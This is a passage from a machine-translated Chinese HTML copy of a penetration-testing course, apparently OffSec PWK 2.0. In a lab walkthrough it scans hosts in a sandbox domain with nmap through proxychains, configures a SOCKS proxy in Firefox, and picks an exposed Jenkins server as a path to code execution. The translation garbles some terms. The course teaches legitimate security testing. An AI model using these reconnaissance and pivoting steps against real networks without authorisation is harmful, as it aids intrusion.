<div style="position:absolute;top:12726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">森林名称：sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:12744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">FQDN：SANDBOXDC.sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:12761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 系统时间：2019-12-18T10:08:27-08:00</font></font></nobr></div>
<div style="position:absolute;top:12778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb-安全模式：</font></font></nobr></div>
<div style="position:absolute;top:12794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">account_used: &lt;空白&gt;</font></font></nobr></div>
<div style="position:absolute;top:12811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">authentication_level: 用户</font></font></nobr></div>
<div style="position:absolute;top:12828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">挑战响应：支持</font></font></nobr></div>
<div style="position:absolute;top:12845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ message_signing: 必需</font></font></nobr></div>
<div style="position:absolute;top:12862;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb2-安全模式：</font></font></nobr></div>
<div style="position:absolute;top:12879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">2.02：</font></font></nobr></div>
<div style="position:absolute;top:12896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 消息签名已启用且需要</font></font></nobr></div>
<div style="position:absolute;top:12913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb2 时间：</font></font></nobr></div>
<div style="position:absolute;top:12930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">日期：2019-12-12T10:36:38</font></font></nobr></div>
<div style="position:absolute;top:12947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 开始日期：2019-12-11T12:02:08</font></font></nobr></div>
<div style="position:absolute;top:12981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：在 67.55 秒内扫描了 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:13000;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 983 - 使用脚本对 DC 进行 Nmap 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:13030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器似乎是较新的版本 (Windows Server 2016)，并且从两次扫描来看，它</font></font></nobr></div>
<div style="position:absolute;top:13049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了用于域控制器的服务之外，似乎没有运行任何服务。</font><font style="vertical-align: inherit;">尽管</font></font></nobr></div>
<div style="position:absolute;top:13068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器有可能通过特定漏洞直接被利用，从</font></font></nobr></div>
<div style="position:absolute;top:13088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据我们的经验，这不太可能，因为这些服务器通常是经过加固的。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:13243;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="12"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 12 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:13276;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:14353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:14353;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:14353;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">821</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:13372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们继续回顾 10.5.5.25，希望它成为一个更好的目标。</font><font style="vertical-align: inherit;">我们将重新开始</font></font></nobr></div>
<div style="position:absolute;top:13391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用默认的 Nmap 脚本 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sC</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">进行 Nmap 扫描</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/poultry$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proxychains nmap -p135,139,445,8080 -sC -sT -Pn 10.5.5.25</font></font></font></b></nobr></div>
<div style="position:absolute;top:13443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyChains-3.1 (http://proxychains.sf.net)</font></font></nobr></div>
<div style="position:absolute;top:13460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2020-01-01 16:03 MST 开始 Nmap 7.80 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:13477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:13494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.25 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:13511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.077 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:13545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:13562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc</font></font></nobr></div>
<div style="position:absolute;top:13579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:13596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></nobr></div>
<div style="position:absolute;top:13613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8080/tcp 打开http-proxy</font></font></nobr></div>
<div style="position:absolute;top:13630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">http-robots.txt：1 个不允许的条目</font></font></nobr></div>
<div style="position:absolute;top:13647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_/</font></font></nobr></div>
<div style="position:absolute;top:13663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_http-title: 站点没有标题 (text/html;charset=utf-8)。</font></font></nobr></div>
<div style="position:absolute;top:13698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机脚本结果：</font></font></nobr></div>
<div style="position:absolute;top:13715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_clock-skew：平均值：2h40m01s，偏差：4h37m11s，中值：-1s</font></font></nobr></div>
<div style="position:absolute;top:13732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb-os-发现：</font></font></nobr></div>
<div style="position:absolute;top:13748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">操作系统：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 专业版 15063（Windows 10 专业版 6.3）</font></font></font></b></nobr></div>
<div style="position:absolute;top:13765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">操作系统 CPE：cpe:/o:microsoft:windows_10::-</font></font></nobr></div>
<div style="position:absolute;top:13782;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">计算机名称：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CEVAPI</font></font></font></b></nobr></div>
<div style="position:absolute;top:13799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">NetBIOS 计算机名称：CEVAPI\x00</font></font></nobr></div>
<div style="position:absolute;top:13816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">域名：sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:13833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">森林名称：sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:13850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">FQDN：CEVAPI.sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:13867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 系统时间：2020-01-01T15:03:40-08:00</font></font></nobr></div>
<div style="position:absolute;top:13884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb-安全模式：</font></font></nobr></div>
<div style="position:absolute;top:13901;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">account_used：来宾</font></font></nobr></div>
<div style="position:absolute;top:13918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">authentication_level: 用户</font></font></nobr></div>
<div style="position:absolute;top:13935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">挑战响应：支持</font></font></nobr></div>
<div style="position:absolute;top:13952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ message_signing：禁用（危险，但默认）</font></font></nobr></div>
<div style="position:absolute;top:13969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb2-安全模式：</font></font></nobr></div>
<div style="position:absolute;top:13986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">2.02：</font></font></nobr></div>
<div style="position:absolute;top:14003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 消息签名已启用但不是必需的</font></font></nobr></div>
<div style="position:absolute;top:14020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb2 时间：</font></font></nobr></div>
<div style="position:absolute;top:14037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">日期：2020-01-01T23:03:37</font></font></nobr></div>
<div style="position:absolute;top:14054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 开始日期：2020-01-01T22:07:03</font></font></nobr></div>
<div style="position:absolute;top:14088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：19.77 秒内扫描 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:14107;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 984 - 使用脚本对 10.5.5.25 进行 Nmap 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:14136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap扫描发现10.5.5.25目标名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cevapi</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，运行的是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10</font></font></i></nobr></div>
<div style="position:absolute;top:14156;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">亲</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们的 Nmap 扫描还发现主机上打开了 8080 端口，并建议使用 http-proxy</font></font></nobr></div>
<div style="position:absolute;top:14175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务正在其上运行。</font><font style="vertical-align: inherit;">但是，此端口也常用于运行 HTTP 应用程序。</font><font style="vertical-align: inherit;">一</font></font></nobr></div>
<div style="position:absolute;top:14194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集更多信息的简单方法是访问该页面。</font><font style="vertical-align: inherit;">我们首先必须配置 Firefox</font></font></nobr></div>
<div style="position:absolute;top:14214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用我们的 SOCKS 代理。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:14431;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="13"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 13 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:14464;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:15541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:15541;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:15541;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">822</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:14554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.7.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:14575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可以通过打开 Firefox 首选项并搜索“代理”来完成。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:14927;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 352：搜索代理设置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:14958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应取消选中“为所有协议使用此代理服务器”选项，并且 SOCKS 主机必须</font></font></nobr></div>
<div style="position:absolute;top:14977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置为 127.0.0.1，端口为 1080。 最后，我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SOCKS v4</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单选按钮，然后单击</font></font></nobr></div>
<div style="position:absolute;top:14996;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:15619;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="14"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 14 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:15652;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:16729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:16729;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:16729;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">823</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:16405;left:341"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 353：配置 SOCKS 代理 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:16807;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="15"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 15 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:16840;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:17917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:17917;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:17917;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">824</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:16930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.7.1.1.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:16951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将打开一个新选项卡并访问 http://10.5.5.25:8080</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:17489;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 354：在端口 8080 上访问 10.5.5.25</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开的页面是 Jenkins </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">745</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录页面。</font><font style="vertical-align: inherit;">这是一个非常有趣的目标，因为 Jenkins 是一个</font></font></nobr></div>
<div style="position:absolute;top:17539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常强大的软件，可能会暴露一些攻击面。</font><font style="vertical-align: inherit;">因此，我们将</font></font></nobr></div>
<div style="position:absolute;top:17559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来把精力集中在这个主机上。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:17596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8 以 Jenkins 服务器为目标</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jenkins 是一个自动化服务器，可用于自动化与以下相关的许多任务</font></font></nobr></div>
<div style="position:absolute;top:17657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件开发。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">746</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于其性质，持续集成和交付工具如</font></font></nobr></div>
<div style="position:absolute;top:17676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jenkins 通常能够执行代码。</font><font style="vertical-align: inherit;">这是设置自定义可重复项所必需的</font></font></nobr></div>
<div style="position:absolute;top:17696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由特定事件或动作触发的任务。</font></font></nobr></div>
<div style="position:absolute;top:17729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">像 Jenkins 这样的工具的一个常见用例是在提交提交后拉一个 git repo，运行一个集合</font></font></nobr></div>
<div style="position:absolute;top:17748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试以确保在更改期间应用程序没有任何损坏，如果一切顺利，</font></font></nobr></div>
<div style="position:absolute;top:17767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将新代码合并到 master 分支。</font><font style="vertical-align: inherit;">为了做到这一点，詹金斯需要有能力</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:17847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">745 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Jenkins_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（软件）</font></font></font></nobr></div>
<div style="position:absolute;top:17867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">746 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（持续交付基金会，2020 年），https://jenkins.io/doc/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:17995;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="16"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 16 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:18028;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:19105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:19105;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:19105;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">825</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行系统命令。</font><font style="vertical-align: inherit;">作为渗透测试人员，访问 Jenkins 将为我们提供一条途径</font></font></nobr></div>
<div style="position:absolute;top:18143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码执行。</font></font></nobr></div>
<div style="position:absolute;top:18176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与往常一样，我们希望在开始尝试利用之前进行某种程度的枚举</font></font></nobr></div>
<div style="position:absolute;top:18195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何事物。</font><font style="vertical-align: inherit;">我们已经通过端口扫描进行了一些网络枚举，但现在我们</font></font></nobr></div>
<div style="position:absolute;top:18215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">希望只专注于 Jenkins Web 应用程序。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:18249;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.1</font></font></i></nobr></div>
<div style="position:absolute;top:18249;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们可以通过查看 Jenkins 的文档对象模型（DOM）开始我们的枚举</font></font></nobr></div>
<div style="position:absolute;top:18306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录页面。</font><font style="vertical-align: inherit;">稍后我们还将查看 HTML 源代码，因为它可能与 DOM 不同。</font><font style="vertical-align: inherit;">至</font></font></nobr></div>
<div style="position:absolute;top:18326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看 DOM，我们右键单击页面上的任意位置并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Inspect Element</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18864;left:371"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 355：检查元素 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:19183;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="17"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 17 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:19216;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:20293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:20293;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:20293;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">826</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:19306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开 Firefox Web Developer Tools，我们右键单击顶部的 HTML 标签并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">展开</font></font></i></nobr></div>
<div style="position:absolute;top:19346;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19884;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 356：扩展 DOM </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:20371;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="18"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 18 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:20404;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:21481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:21481;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:21481;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">827</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
